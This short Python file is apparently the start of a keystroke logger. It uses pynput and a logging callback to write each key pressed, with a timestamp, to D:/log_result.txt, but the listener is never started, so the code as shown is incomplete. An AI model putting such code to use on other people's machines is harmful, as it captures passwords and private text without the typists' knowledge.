from pynput.keyboard import Key, Listener
import logging
'''记录键盘操作'''


log_directory = 'D:/log_result.txt'
logging.basicConfig(filename=(log_directory), level=logging.DEBUG, format='%(created)f==> %(message)s')


def keypress(Key):
    logging.info(str(Key))
